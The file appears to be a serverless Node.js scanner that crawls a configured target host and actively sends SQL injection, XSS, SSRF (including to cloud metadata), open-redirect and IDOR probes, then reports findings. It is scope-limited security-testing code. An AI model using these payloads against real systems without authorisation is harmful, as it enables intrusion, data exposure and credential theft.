const crypto = require("crypto");

const TARGET = (process.env.TARGET_HOST || "").toLowerCase();
const MAX_PAGES = 40;
const TIMEOUT = 12000;
const CONCURRENCY = 4;

function json(statusCode, body) {
  return {
    statusCode,
    headers: { "Content-Type": "application/json", "Cache-Control": "no-store" },
    body: JSON.stringify(body)
  };
}

function inScope(url) {
  if (!["http:", "https:"].includes(url.protocol)) return false;
  if (!TARGET) return false;
  const h = url.hostname.toLowerCase();
  return h === TARGET || h.endsWith("." + TARGET);
}

const SQLI_PAYLOADS = [
  "'",
  "\"",
  "' OR '1'='1",
  "' OR '1'='1'-- -",
  "1' AND SLEEP(5)-- -",
  "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -",
  "' UNION SELECT NULL,NULL,NULL-- -",
  "'; WAITFOR DELAY '0:0:5'-- -",
  "1' AND 1=CAST((SELECT version()) AS int)-- -",
  "') OR ('1'='1",
  "admin'-- -"
];

const SQL_ERRORS = [
  /SQL syntax.*MySQL/i,
  /Warning.*mysql_/i,
  /valid MySQL result/i,
  /MySqlClient\./i,
  /PostgreSQL.*ERROR/i,
  /Warning.*\Wpg_/i,
  /valid PostgreSQL result/i,
  /ORA-\d{4,5}/i,
  /Oracle error/i,
  /Microsoft SQL Native Client error/i,
  /SQLServer JDBC Driver/i,
  /SQLite\/JDBCDriver/i,
  /SQLite.Exception/i,
  /System\.Data\.SQLite\.SQLiteException/i,
  /unclosed quotation mark after the character string/i,
  /quoted string not properly terminated/i,
  /You have an error in your SQL syntax/i
];

const XSS_PAYLOADS = [
  "<script>alert(1)</script>",
  "\"><svg/onload=alert(1)>",
  "'><img src=x onerror=alert(1)>",
  "javascript:alert(1)",
  "<details open ontoggle=alert(1)>",
  "\"><iframe srcdoc=<script>alert(1)</script>>",
  "<body onload=alert(1)>"
];

const SSRF_PAYLOADS = [
  "http://169.254.169.254/latest/meta-data/",
  "http://127.0.0.1:22/",
  "http://[::1]:80/",
  "http://localhost/admin",
  "http://0.0.0.0:8080/"
];

const OPEN_REDIRECTS = [
  "https://evil.example/",
  "//evil.example/",
  "/\\evil.example/",
  "https:evil.example"
];

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function timedFetch(url, opts = {}) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), TIMEOUT);
  const t0 = Date.now();
  try {
    const res = await fetch(url, {
      ...opts,
      signal: controller.signal,
      redirect: "manual",
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; Scan/1.0)",
        "Accept": "*/*",
        ...(opts.headers || {})
      }
    });
    const elapsed = Date.now() - t0;
    const body = await res.text().catch(() => "");
    return { res, body, elapsed, status: res.status, headers: res.headers };
  } finally {
    clearTimeout(timer);
  }
}

function extractLinks(html, base) {
  const out = [];
  for (const m of html.matchAll(/href\s*=\s*["']([^"'#\s]+)["']/gi)) {
    try {
      const u = new URL(m[1], base);
      if (u.origin === base.origin) out.push(u);
    } catch {}
  }
  return out;
}

function extractForms(html, base) {
  const forms = [];
  for (const fm of html.matchAll(/<form\b([^>]*)>([\s\S]*?)<\/form>/gi)) {
    const attrs = fm[1];
    const inner = fm[2];
    const action = (attrs.match(/\baction\s*=\s*["']([^"']*)["']/i) || [,""])[1];
    const method = ((attrs.match(/\bmethod\s*=\s*["']([^"']*)["']/i) || [,"GET"])[1] || "GET").toUpperCase();
    const inputs = [];
    for (const im of inner.matchAll(/<(input|textarea|select)\b([^>]*)>/gi)) {
      const type = (im[2].match(/\btype\s*=\s*["']([^"']*)["']/i) || [,"text"])[1].toLowerCase();
      const name = (im[2].match(/\bname\s*=\s*["']([^"']+)["']/i) || [,""])[1];
      const value = (im[2].match(/\bvalue\s*=\s*["']([^"']*)["']/i) || [,""])[1];
      if (name) inputs.push({ name, type, value });
    }
    const csrfName = inputs.find(i => /csrf|token|authenticity/i.test(i.name))?.name;
    forms.push({
      action: action || base.pathname,
      method,
      inputs,
      csrfName,
      url: new URL(action || base.pathname, base).href
    });
  }
  return forms;
}

function extractQueryParams(u) {
  return [...u.searchParams.entries()].map(([name, value]) => ({ name, value }));
}

function buildBody(fields, override = {}) {
  const sp = new URLSearchParams();
  for (const f of fields) sp.append(f.name, override[f.name] !== undefined ? override[f.name] : f.value);
  return sp.toString();
}

function replaceParam(url, name, value) {
  const u = new URL(url);
  u.searchParams.set(name, value);
  return u.href;
}

function extractParamsFromPage(html, base) {
  const seen = new Set();
  const targets = [];
  for (const m of html.matchAll(/(?:href|action|src)\s*=\s*["']([^"']+)["']/gi)) {
    try {
      const u = new URL(m[1], base);
      if (u.origin !== base.origin) continue;
      if (u.search && u.search.length > 1) {
        const key = u.pathname + u.search;
        if (!seen.has(key)) { seen.add(key); targets.push(u); }
      }
    } catch {}
  }
  return targets;
}

async function crawl(start) {
  const queue = [start];
  const visited = new Set();
  const pages = [];
  const errors = [];

  while (queue.length && visited.size < MAX_PAGES) {
    const batch = queue.splice(0, CONCURRENCY);
    await Promise.all(batch.map(async (current) => {
      if (visited.has(current.href)) return;
      visited.add(current.href);
      try {
        const r = await timedFetch(current.href);
        const ct = r.headers.get("content-type") || "";
        if (!ct.includes("text/html")) return;
        const html = r.body.slice(0, 800000);
        pages.push({ url: current.href, html });
        for (const link of extractLinks(html, start)) {
          if (!visited.has(link.href) && queue.length + visited.size < MAX_PAGES * 2) queue.push(link);
        }
      } catch (e) {
        errors.push(`${current.href}: ${e.message}`);
      }
    }));
  }
  return { pages, errors, visited: visited.size };
}

async function testSqliForm(form) {
  const findings = [];
  const baseline = await timedFetch(form.url, {
    method: form.method === "POST" ? "POST" : "GET",
    headers: form.method === "POST" ? { "Content-Type": "application/x-www-form-urlencoded" } : {},
    body: form.method === "POST" ? buildBody(form.inputs) : undefined
  }).catch(() => null);
  const baselineErr = baseline ? SQL_ERRORS.some(re => re.test(baseline.body)) : false;

  for (const input of form.inputs) {
    if (input.type === "hidden" && !form.csrfName) continue;
    for (const payload of SQLI_PAYLOADS) {
      const override = { [input.name]: payload };
      const t0 = Date.now();
      let r;
      try {
        r = form.method === "POST"
          ? await timedFetch(form.url, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: buildBody(form.inputs, override) })
          : await timedFetch(replaceParam(form.url, input.name, payload));
      } catch (e) { continue; }

      const isError = SQL_ERRORS.some(re => re.test(r.body)) && !baselineErr;
      const timing = payload.includes("SLEEP") || payload.includes("WAITFOR");
      const delta = r.elapsed - (baseline?.elapsed ?? 0);
      const timeHit = timing && delta > 4000;

      if (isError) {
        findings.push({
          type: "SQL Injection", severity: "high", where: form.url,
          param: input.name, method: form.method, payload,
          evidence: r.body.match(SQL_ERRORS.find(re => re.test(r.body)))?.[0] || "error signature",
          kind: "error-based"
        });
        break;
      }
      if (timeHit) {
        findings.push({
          type: "SQL Injection", severity: "high", where: form.url,
          param: input.name, method: form.method, payload,
          evidence: `response delta ${delta}ms vs baseline`, kind: "time-based"
        });
        break;
      }
    }
  }
  return findings;
}

async function testSqliQuery(paramUrl) {
  const findings = [];
  const base = new URL(paramUrl);
  const baseline = await timedFetch(base.href).catch(() => null);
  const baselineErr = baseline ? SQL_ERRORS.some(re => re.test(baseline.body)) : false;

  for (const [name] of base.searchParams) {
    for (const payload of SQLI_PAYLOADS) {
      const u = new URL(base.href);
      u.searchParams.set(name, payload);
      let r;
      try { r = await timedFetch(u.href); } catch { continue; }

      const isError = SQL_ERRORS.some(re => re.test(r.body)) && !baselineErr;
      const timing = payload.includes("SLEEP") || payload.includes("WAITFOR");
      const delta = r.elapsed - (baseline?.elapsed ?? 0);
      const timeHit = timing && delta > 4000;

      if (isError || timeHit) {
        findings.push({
          type: "SQL Injection", severity: "high", where: u.pathname,
          param: name, method: "GET", payload,
          evidence: isError ? "error signature in response" : `response delta ${delta}ms`,
          kind: isError ? "error-based" : "time-based"
        });
        break;
      }
    }
  }
  return findings;
}

async function testXssForm(form) {
  const findings = [];
  for (const input of form.inputs) {
    if (["hidden","submit","button","file"].includes(input.type)) continue;
    for (const payload of XSS_PAYLOADS) {
      const override = { [input.name]: payload };
      let r;
      try {
        r = form.method === "POST"
          ? await timedFetch(form.url, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: buildBody(form.inputs, override) })
          : await timedFetch(replaceParam(form.url, input.name, payload));
      } catch { continue; }
      const ct = r.headers.get("content-type") || "";
      if (!ct.includes("html")) continue;
      const reflected = r.body.includes(payload);
      const unescaped = reflected && (
        payload.includes("<script>") && r.body.includes("<script>alert(1)</script>") ||
        payload.includes("onerror=") && r.body.includes(payload)
      );
      if (reflected) {
        findings.push({
          type: "XSS", severity: unescaped ? "high" : "medium",
          where: form.url, param: input.name, method: form.method,
          payload, evidence: unescaped ? "reflected unescaped" : "reflected (encoding context needs verification)",
          kind: "reflected"
        });
        break;
      }
    }
  }
  return findings;
}

async function testXssQuery(paramUrl) {
  const findings = [];
  const base = new URL(paramUrl);
  for (const [name] of base.searchParams) {
    for (const payload of XSS_PAYLOADS) {
      const u = new URL(base.href);
      u.searchParams.set(name, payload);
      let r;
      try { r = await timedFetch(u.href); } catch { continue; }
      const ct = r.headers.get("content-type") || "";
      if (!ct.includes("html")) continue;
      if (r.body.includes(payload)) {
        findings.push({
          type: "XSS", severity: payload.includes("<script>") && r.body.includes(payload) ? "high" : "medium",
          where: u.pathname, param: name, method: "GET",
          payload, evidence: "payload reflected in response body", kind: "reflected"
        });
        break;
      }
    }
  }
  return findings;
}

function idorCandidates(html, base) {
  const out = [];
  const seen = new Set();
  for (const m of html.matchAll(/(?:href|action|src)\s*=\s*["']([^"']+)["']/gi)) {
    try {
      const u = new URL(m[1], base);
      if (u.origin !== base.origin) continue;
      const segments = u.pathname.split("/").filter(Boolean);
      const hasNumeric = segments.some(s => /^\d+$/.test(s));
      const hasUuid = segments.some(s => /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(s));
      const hasParamId = [...u.searchParams.keys()].some(k => /^(id|user|userid|uid|account|acct|order|invoice|doc|file|pid)$/i.test(k));
      if (hasNumeric || hasUuid || hasParamId) {
        const key = u.pathname + u.search;
        if (!seen.has(key)) { seen.add(key); out.push(u); }
      }
    } catch {}
  }
  return out;
}

function mutateObjectId(url) {
  const out = [];
  const u = new URL(url);
  const pathSegs = u.pathname.split("/").map((seg, i) => {
    if (/^\d+$/.test(seg)) {
      const n = parseInt(seg, 10);
      return { index: i, candidates: [String(n - 1), String(n + 1), "1", "0"].filter(v => v !== seg) };
    }
    return null;
  }).filter(Boolean);
  for (const { index, candidates } of pathSegs) {
    for (const c of candidates) {
      const segs = u.pathname.split("/");
      segs[index] = c;
      const nu = new URL(u.href);
      nu.pathname = segs.join("/");
      out.push(nu.href);
    }
  }
  for (const [name, value] of u.searchParams) {
    if (/^(id|user|userid|uid|account|order|invoice|doc|file|pid)$/i.test(name) && /^\d+$/.test(value)) {
      const n = parseInt(value, 10);
      for (const c of [String(n - 1), String(n + 1), "1", "0"]) {
        if (c === value) continue;
        const nu = new URL(u.href);
        nu.searchParams.set(name, c);
        out.push(nu.href);
      }
    }
  }
  return [...new Set(out)];
}

async function testIdor(candidate) {
  const findings = [];
  const baseline = await timedFetch(candidate.href).catch(() => null);
  if (!baseline || baseline.status !== 200) return findings;
  const baselineLen = baseline.body.length;

  for (const mutated of mutateObjectId(candidate.href)) {
    let r;
    try { r = await timedFetch(mutated); } catch { continue; }
    if (r.status === 200 && r.body.length > 50 && r.body.length !== baselineLen) {
      const sim = jaccard(baseline.body, r.body);
      if (sim < 0.85 && sim > 0.05) {
        findings.push({
          type: "IDOR", severity: "high",
          where: mutated, evidence: `neighbor object returned HTTP 200, body similarity ${(sim * 100).toFixed(1)}%`,
          baseline: candidate.href, mutated
        });
        break;
      }
    }
  }
  return findings;
}

function jaccard(a, b) {
  const setA = new Set(a.slice(0, 5000).split(/\s+/));
  const setB = new Set(b.slice(0, 5000).split(/\s+/));
  let inter = 0;
  for (const w of setA) if (setB.has(w)) inter++;
  const union = setA.size + setB.size - inter;
  return union === 0 ? 0 : inter / union;
}

async function testSsrf(paramUrl) {
  const findings = [];
  const base = new URL(paramUrl);
  for (const [name, value] of base.searchParams) {
    if (!/^(url|uri|redirect|next|target|dest|destination|continue|callback|webhook|image|file|path|fetch|link)$/i.test(name)) continue;
    for (const payload of SSRF_PAYLOADS) {
      const u = new URL(base.href);
      u.searchParams.set(name, payload);
      let r;
      try { r = await timedFetch(u.href); } catch { continue; }
      if (r.status === 200) {
        if (/ami-id|instance-id|iam\/security-credentials|root:x:0:0|OpenSSH|redis_version|HTTP\/1\.[01] 400/i.test(r.body) || r.elapsed > 5000) {
          findings.push({
            type: "SSRF", severity: "critical", where: u.pathname,
            param: name, payload, evidence: `target fetched internal resource (${r.status}, ${r.elapsed}ms)`
          });
          break;
        }
      }
    }
  }
  return findings;
}

async function testOpenRedirect(paramUrl) {
  const findings = [];
  const base = new URL(paramUrl);
  for (const [name] of base.searchParams) {
    if (!/^(url|uri|redirect|next|target|dest|destination|continue|callback|return|returnUrl)$/i.test(name)) continue;
    for (const payload of OPEN_REDIRECTS) {
      const u = new URL(base.href);
      u.searchParams.set(name, payload);
      let r;
      try { r = await timedFetch(u.href); } catch { continue; }
      const loc = r.headers.get("location") || "";
      if (r.status >= 300 && r.status < 400 && /evil\.example/i.test(loc)) {
        findings.push({
          type: "Open Redirect", severity: "medium",
          where: u.pathname, param: name, payload, evidence: `Location: ${loc}`
        });
        break;
      }
    }
  }
  return findings;
}

exports.handler = async (event) => {
  if (event.httpMethod !== "POST") return json(405, { error: "Method not allowed" });

  let input;
  try { input = JSON.parse(event.body || "{}"); } catch { return json(400, { error: "Invalid JSON" }); }

  let start;
  try { start = new URL(input.url); } catch { return json(400, { error: "Invalid URL" }); }
  if (!inScope(start)) return json(403, { error: "TARGET_HOST not configured or URL out of target scope" });

  const findings = [];
  const logs = [`Active scan started against ${start.origin}`];
  const t0 = Date.now();

  const crawlResult = await crawl(start);
  logs.push(`Crawled ${crawlResult.visited} pages, ${crawlResult.errors.length} errors`);

  const allForms = [];
  const allQueryTargets = new Set();
  const allIdorCandidates = new Set();

  for (const page of crawlResult.pages) {
    const pageUrl = new URL(page.url);
    for (const form of extractForms(page.html, pageUrl)) allForms.push(form);
    for (const u of extractParamsFromPage(page.html, pageUrl)) allQueryTargets.add(u.href);
    for (const u of idorCandidates(page.html, pageUrl)) allIdorCandidates.add(u.href);
  }

  logs.push(`Discovered ${allForms.length} forms, ${allQueryTargets.size} parameterized URLs, ${allIdorCandidates.size} IDOR candidates`);

  // SQL injection
  for (const form of allForms) {
    findings.push(...await testSqliForm(form));
  }
  for (const u of allQueryTargets) {
    findings.push(...await testSqliQuery(u));
  }

  // XSS
  for (const form of allForms) {
    findings.push(...await testXssForm(form));
  }
  for (const u of allQueryTargets) {
    findings.push(...await testXssQuery(u));
  }

  // IDOR
  for (const u of allIdorCandidates) {
    findings.push(...await testIdor(new URL(u)));
  }

  // SSRF + open redirect
  for (const u of allQueryTargets) {
    findings.push(...await testSsrf(u));
    findings.push(...await testOpenRedirect(u));
  }

  // Auth-aware IDOR — if two session cookies provided, replay across them
  if (input.sessionA && input.sessionB) {
    logs.push("Cross-session IDOR replay enabled");
    for (const u of allIdorCandidates) {
      const url = new URL(u);
      const a = await timedFetch(url.href, { headers: { Cookie: input.sessionA } }).catch(() => null);
      const b = await timedFetch(url.href, { headers: { Cookie: input.sessionB } }).catch(() => null);
      if (a && b && a.status === 200 && b.status === 200) {
        const sim = jaccard(a.body, b.body);
        if (sim < 0.5) {
          findings.push({
            type: "IDOR (cross-session)", severity: "critical", where: url.pathname,
            evidence: `session B saw content from session A (sim ${(sim*100).toFixed(1)}%)`
          });
        }
      }
    }
  }

  const byType = {};
  for (const f of findings) byType[f.type] = (byType[f.type] || 0) + 1;

  logs.push(`Scan finished in ${Date.now() - t0}ms, ${findings.length} findings`);

  return json(200, {
    success: true,
    target: start.origin,
    pagesVisited: crawlResult.visited,
    findings,
    summary: byType,
    logs
  });
};
